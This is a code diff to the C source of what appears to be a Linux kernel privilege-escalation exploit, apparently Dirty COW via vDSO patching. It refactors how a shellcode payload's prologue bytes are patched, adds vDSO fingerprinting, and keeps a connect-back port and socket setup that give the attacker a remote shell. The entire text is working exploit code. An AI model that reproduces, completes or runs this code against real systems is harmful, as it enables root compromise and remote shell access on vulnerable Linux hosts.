@@ -34,7 +34,7 @@
 #define LOOP			0x10000
 #define VDSO_SIZE		(2 * PAGE_SIZE)
 #define CONNECT_BACK_PORT	1234
-#define PATCH			"\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad\xbe\xef"
+#define PATCH			"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
 #define ARRAY_SIZE(arr)		(sizeof(arr) / sizeof(arr[0]))
 
 typedef unsigned int uint32_t;
@@ -45,6 +45,14 @@ struct vdso_patch {
 	unsigned char *copy;
 	size_t size;
 	void *addr;
+};
+
+struct payload_patch {
+	const char *name;
+	void *pattern;
+	size_t pattern_size;
+	void *buf;
+	size_t size;
 };
 
 struct prologue {
@@ -143,18 +151,44 @@ static int ptrace_memcpy(pid_t pid, void *dest, const void *src, size_t n)
 	return 0;
 }
 
-static int patch_payload(struct prologue *prologue)
+static int patch_payload_helper(struct payload_patch *pp)
 {
 	unsigned char *p;
 
-	p = memmem(payload, payload_len, PATCH, sizeof(PATCH)-1);
+	p = memmem(payload, payload_len, pp->pattern, pp->pattern_size);
 	if (p == NULL) {
-		fprintf(stderr, "[-] failed to patch payload\n");
+		fprintf(stderr, "[-] failed to patch payload's %s\n", pp->name);
 		return -1;
 	}
 
-	memset(p, '\x90', sizeof(PATCH)-1 - prologue->size);
-	memcpy(p + sizeof(PATCH)-1 - prologue->size, prologue->opcodes, prologue->size);
+	memcpy(p, pp->buf, pp->size);
+
+	p = memmem(payload, payload_len, pp->pattern, pp->pattern_size);
+	if (p != NULL) {
+		fprintf(stderr,
+			"[-] payload's %s pattern was found several times\n",
+			pp->name);
+		return -1;
+	}
+
+	return 0;
+}
+
+/*
+ * A few bytes of the payload must be patched: prologue.
+ */
+static int patch_payload(struct prologue *p)
+{
+	int i;
+
+	struct payload_patch payload_patch[] = {
+		{ "prologue", PATCH, sizeof(PATCH)-1, p->opcodes, p->size },
+	};
+
+	for (i = 0; i < ARRAY_SIZE(payload_patch); i++) {
+		if (patch_payload_helper(&payload_patch[i]) == -1)
+			return -1;
+	}
 
 	return 0;
 }
@@ -179,14 +213,12 @@ static int save_orig_vdso(void)
 	return 0;
 }
 
-static int build_vdso_patch(void *vdso_addr)
+static int build_vdso_patch(void *vdso_addr, struct prologue *prologue)
 {
 	uint32_t clock_gettime_offset, target;
 	unsigned long clock_gettime_addr;
-	struct prologue *prologue;
 	unsigned char *p, *buf;
 	uint64_t entry_point;
-	bool patched;
 	int i;
 
 	/* e_entry */
@@ -194,24 +226,6 @@ static int build_vdso_patch(void *vdso_addr)
 	entry_point = *(uint64_t *)(p + 0x18);
 	clock_gettime_offset = (uint32_t)entry_point & 0xfff;
 	clock_gettime_addr = (unsigned long)vdso_addr + clock_gettime_offset;
-
-	/* patch payload with appropriate prologue */
-	patched = false;
-	for (i = 0; i < ARRAY_SIZE(prologues); i++) {
-		prologue = &prologues[i];
-		if (memcmp((void *)clock_gettime_addr, prologue->opcodes, prologue->size) == 0) {
-			if (patch_payload(prologue) == -1)
-				return -1;
-			patched = true;
-			break;
-		}
-	}
-
-	if (!patched) {
-		fprintf(stderr, "[-] this vDSO version isn't supported\n");
-		fprintf(stderr, "    add first entry point instructions to prologues\n");
-		return -1;
-	}
 
 	/* patch #1: put payload at the end of vdso */
 	vdso_patch[0].patch = payload;
@@ -554,8 +568,31 @@ static int yeah(struct mem_arg *arg, int s)
 	return 0;
 }
 
-int main(void)
+static struct prologue *fingerprint_prologue(void *vdso_addr)
 {
+	unsigned long clock_gettime_addr;
+	uint32_t clock_gettime_offset;
+	uint64_t entry_point;
+	struct prologue *p;
+	int i;
+
+	/* e_entry */
+	entry_point = *(uint64_t *)((unsigned char *)vdso_addr + 0x18);
+	clock_gettime_offset = (uint32_t)entry_point & 0xfff;
+	clock_gettime_addr = (unsigned long)vdso_addr + clock_gettime_offset;
+
+	for (i = 0; i < ARRAY_SIZE(prologues); i++) {
+		p = &prologues[i];
+		if (memcmp((void *)clock_gettime_addr, p->opcodes, p->size) == 0)
+			return p;
+	}
+
+	return NULL;
+}
+
+int main(int argc, char *argv[])
+{
+	struct prologue *prologue;
 	struct mem_arg arg;
 	int s;
 
@@ -563,7 +600,17 @@ int main(void)
 	if (arg.vdso_addr == NULL)
 		return EXIT_FAILURE;
 
-	if (build_vdso_patch(arg.vdso_addr) == -1)
+	prologue = fingerprint_prologue(arg.vdso_addr);
+	if (prologue == NULL) {
+		fprintf(stderr, "[-] this vDSO version isn't supported\n");
+		fprintf(stderr, "    add first entry point instructions to prologues\n");
+		return EXIT_FAILURE;
+	}
+
+	if (patch_payload(prologue) == -1)
+		return EXIT_FAILURE;
+
+	if (build_vdso_patch(arg.vdso_addr, prologue) == -1)
 		return EXIT_FAILURE;
 
 	s = create_socket();
